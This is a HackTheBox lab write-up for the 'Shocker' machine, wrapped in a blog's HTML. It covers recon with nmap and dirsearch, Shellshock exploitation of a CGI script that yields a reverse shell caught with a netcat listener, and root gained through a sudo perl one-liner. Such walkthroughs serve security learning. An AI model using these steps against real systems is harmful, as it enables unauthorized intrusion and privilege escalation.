@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Shocker Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="Writeup on Shocker (Linux HackTheBox), w/o Metasploit, exploiting Shellshock &amp; SUDO permissions for privilege escalation.">
+    <link rel="canonical" href="https://sheerazali.com/blog/shocker-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Shocker Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="Writeup on Shocker (Linux HackTheBox), w/o Metasploit, exploiting Shellshock &amp; SUDO permissions for privilege escalation.">
+    <meta property="og:url" content="https://sheerazali.com/blog/shocker-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/02/shocker.png?fit&#x3D;768%2C425&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2021-12-01T12:32:19.000Z">
+    <meta property="article:modified_time" content="2022-02-05T05:57:59.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Shocker Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="Writeup on Shocker (Linux HackTheBox), w/o Metasploit, exploiting Shellshock &amp; SUDO permissions for privilege escalation.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/shocker-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/02/shocker.png?fit&#x3D;768%2C425&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="768">
+    <meta property="og:image:height" content="425">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Shocker Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/shocker-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2021-12-01T12:32:19.000Z",
+    "dateModified": "2022-02-05T05:57:59.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/02/shocker.png?fit=768%2C425&ssl=1",
+        "width": 768,
+        "height": 425
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "Writeup on Shocker (Linux HackTheBox), w/o Metasploit, exploiting Shellshock &amp; SUDO permissions for privilege escalation.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/shocker-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">December 01, 2021</span>
+        <span class="reading-time">6 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Shocker Writeup / Walkthrough Hack the box">Shocker Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/02/shocker.png?fit&#x3D;768%2C425&amp;ssl&#x3D;1" alt="Shocker Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Shocker Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h1 id="tldr">TL;DR</h1><p><strong><strong>T</strong></strong>his is a walkthrough writeup on Shocker which is a Linux box categorized as easy on HackTheBox. The initial foothold was gained by discovering &amp; exploiting the ShellShcok vulnerability to gain the user shell. Priviliege escalation part was relatively easy and was done by exploiting the SUDO permissions for the user. Overall, this was a pretty easy box with a primary focus on the Shellshock exploitation.</p><h1 id="walkthrough">Walkthrough</h1><h2 id="shocker-writeup-scanning-network">Shocker Writeup: Scanning Network</h2><p>Running the usual Nmap port scan :</p><pre><code class="language-markdown">Command used --&gt; nmap -n -Pn -A -v -sC -sV -oN nmap.initial 10.10.10.56
+Nmap scan report for 10.10.10.56
+Host is up (0.17s latency).
+Not shown: 998 closed ports
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</code></pre><p>We got 2 open ports :</p><p><code>port 80</code> : Apache web-server<br><code>port 2222</code> : SSH</p><hr><h2 id="shocker-writeup-web-enumeration">Shocker Writeup: Web Enumeration</h2><p>Checking out the hosted website in our browser :</p><p>We get to see this image on the index page of the website –</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-13.png" class="kg-image" alt="Shocker Writeup" loading="lazy" width="424" height="413"><figcaption><code>/index.html</code></figcaption></figure><hr><h2 id="running-a-dirsearch-scan">Running a Dirsearch Scan</h2><pre><code class="language-markdown">dirsearch.py -u http://10.10.10.56/ -e php,html -o ./disearch_def.txt
+
+403   297B   http://10.10.10.56:80/.ht_wsr.txt
+403   300B   http://10.10.10.56:80/.htaccess.bak1
+403   302B   http://10.10.10.56:80/.htaccess.sample
+403   300B   http://10.10.10.56:80/.htaccess.orig
+403   300B   http://10.10.10.56:80/.htaccess.save
+403   298B   http://10.10.10.56:80/.htaccess_sc
+403   301B   http://10.10.10.56:80/.htaccess_extra
+403   300B   http://10.10.10.56:80/.htaccess_orig
+403   298B   http://10.10.10.56:80/.htaccessOLD
+403   298B   http://10.10.10.56:80/.htaccessBAK
+403   299B   http://10.10.10.56:80/.htaccessOLD2
+403   290B   http://10.10.10.56:80/.htm
+403   291B   http://10.10.10.56:80/.html
+403   296B   http://10.10.10.56:80/.htpasswds
+403   297B   http://10.10.10.56:80/.httr-oauth
+403   300B   http://10.10.10.56:80/.htpasswd_test
+403   299B   http://10.10.10.56:80/server-status
+403   300B   http://10.10.10.56:80/server-status/
+
+403   294B   http://10.10.10.56:80/cgi-bin/
+
+200   137B   http://10.10.10.56:80/index.html</code></pre><p>I was kinds stuck here, because we found nothing worth attacking.</p><p>But we see <code>/cgi-bin/</code> directory which was forbidden &amp; from my past experience I figured that this might lead us somewhere. So, I went ahead and launched a <code>dirsearch</code> scan on the <code>/cgi-bin/</code> directory to discover any other interesting sub-directories or files inside this directory.</p><p>Usually the CGI scripts inside the <code>/cgi-bin/</code> directory are compiled programs, so I added the extension flag in the dirsearch scan to discover any bash, php or python files :  <code>-e sh,py,php</code></p><pre><code class="language-markdown"># Dirsearch started Tue Nov  2 03:06:44 2021 as: 
+dirsearch.py -u http://10.10.10.56/cgi-bin/ -o ./dirsearch_cgi.txt -e sh,py,php
+
+200   119B   http://10.10.10.56:80/cgi-bin/user.sh</code></pre><p>And indeed, we did find a potentially useful file <code>/cgi-bin/user.sh</code></p><hr><p>What is a CGI script ? -&gt; In computing, Common Gateway Interface (CGI) is an interface specification that enables web servers to execute an external program, typically to process user requests. -&gt; Such programs are often written in a scripting language and are commonly referred to as CGI scripts, but they may include compiled programs. -&gt; CGI is used in Dynamic websites, because in static websites, there is no user input which needs to processed.</p><hr><p>On visiting the <code>user.sh</code> file, we get the following file :</p><pre><code class="language-bash">Content-Type: text/plain
+
+Just an uptime test script
+
+ 03:17:52 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00</code></pre><p>This looks like the output of the <code>uptime</code> command in Linux, verifying that this is a CGI bash script running on Shocker.</p><hr><h2 id="shocker-writeup-exploitation">Shocker Writeup: Exploitation</h2><p>Now, because the box name is “<strong>Shocker</strong>” and we have found a CGI bash script on the box. The foremost vulnerability that one should think of is the well known “<strong>ShellShock Vulnerability</strong>“.</p><p>Also, a quick google search about “<strong><code>cgi-bin</code></strong> exploits” will give you plenty or results about the ShellShock vulnerability.</p><p><em>(To be honest, I recently did a box from Vulnhub named SickOS 1.1 &amp; the primary</em> <em>vulnerability in this box was also ShellShock, thus I had an idea about it)</em></p><p>What is Shell-shock ? -&gt; Bash allows functions to be defined in environment variables. The vulnerability is caused by the fact that if an environment variable passed to a bash script &amp; contains a function definition followed by arbitrary bash commands, those commands are executed. -&gt; Before running a CGI script, Apache gives it some context by setting environment variables corresponding to some of the HTTP headers of the request, such as User-Agent, Cookie, Referer etc. Since those are fully user controlled, we can inject any payload we want in them &amp; get RCE. You can read more about ShellShock <a href="//blog.cloudflare.com/inside-shellshock/" rel="noreferrer noopener">here</a>.</p><h3 id="manually-verifying-shellshock">Manually Verifying ShellShock</h3><p>We will use BurpSuite to send the malicious request and view the response from Shocker.</p><p>Alternatively, you can also run the <strong><em>nmap</em></strong> <code>--script http-shellshock</code> script on the target to check if it is vulnerable to ShellShock or not.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-15.png" class="kg-image" alt="Shocker Writeup" loading="lazy" width="770" height="184"><figcaption>Verifying ShellShock in BurpSuite</figcaption></figure><p>We can see the output “<em><strong>exploited</strong></em>” in the response, which verifies that Shocker is vulnerable to ShellShock, and thus we have RCE on the box. Let’s now obtain a reverse shell.</p><hr><hr><h2 id="shocker-writeup-user-flag-%E2%9B%B3">Shocker Writeup: User Flag ⛳</h2><p>Exploiting RCE to get a reverse shell :</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2021_11_image-16.png" class="kg-image" alt loading="lazy" width="770" height="264"><figcaption>Obtaining a reverse shell</figcaption></figure><pre><code class="language-bash">┌─[root@kali]─[~/Desktop/Boxes/HTB/Shocker]
+└──╼ #nc -nvlp 6969
+listening on [any] 6969 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.10.56] 33354
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ whoami
+shelly
+
+shelly@Shocker:/usr/lib/cgi-bin$ id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+shelly@Shocker:/usr/lib/cgi-bin$ pwd
+/usr/lib/cgi-bin
+
+shelly@Shocker:/usr/lib/cgi-bin$ cd /home
+
+shelly@Shocker:/home$ ls -al
+total 12
+drwxr-xr-x  3 root   root   4096 Sep 22  2017 .
+drwxr-xr-x 23 root   root   4096 Sep 22  2017 ..
+drwxr-xr-x  4 shelly shelly 4096 Sep 22  2017 shelly
+
+shelly@Shocker:/home$ cd shelly
+
+shelly@Shocker:/home/shelly$ ls -al
+total 36
+drwxr-xr-x 4 shelly shelly 4096 Sep 22  2017 .
+drwxr-xr-x 3 root   root   4096 Sep 22  2017 ..
+-rw------- 1 root   root      0 Sep 25  2017 .bash_history
+-rw-r--r-- 1 shelly shelly  220 Sep 22  2017 .bash_logout
+-rw-r--r-- 1 shelly shelly 3771 Sep 22  2017 .bashrc
+drwx------ 2 shelly shelly 4096 Sep 22  2017 .cache
+drwxrwxr-x 2 shelly shelly 4096 Sep 22  2017 .nano
+-rw-r--r-- 1 shelly shelly  655 Sep 22  2017 .profile
+-rw-r--r-- 1 root   root     66 Sep 22  2017 .selected_editor
+-rw-r--r-- 1 shelly shelly    0 Sep 22  2017 .sudo_as_admin_successful
+-r--r--r-- 1 root   root     33 Nov  2 02:15 user.txt
+
+shelly@Shocker:/home/shelly$ cat user.txt
+102b4***************************</code></pre><hr><h2 id="privilege-escalation">Privilege Escalation</h2><p>Checking the SUDO permissions for the user <strong>Shelly</strong> :</p><pre><code class="language-bash">shelly@Shocker:/home/shelly$ sudo -l
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl</code></pre><p>Great! We can excute <code>/usr/bin/perl</code> as root. It’s pretty straightforward to get an elevated root shell from here 🙂</p><hr><h2 id="shocker-writeup-root-flag-%E2%9B%B3">Shocker Writeup: Root Flag ⛳</h2><p>Executing <code>/bin/bash</code> through <code>perl</code>.</p><pre><code class="language-bash">shelly@Shocker:/tmp$ sudo perl -e 'exec "/bin/bash"'
+root@Shocker:/tmp# whoami
+root
+
+root@Shocker:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@Shocker:/tmp# cd /root
+
+root@Shocker:~# ls
+root.txt
+
+root@Shocker:~# cat root.txt
+a2a5***************************
+</code></pre><hr><p>So, that was all for Shocker. Until next time, do checkout other interesting writeups &amp; articles on <a href="https://sheerazali.com/">sheerazali.com</a></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
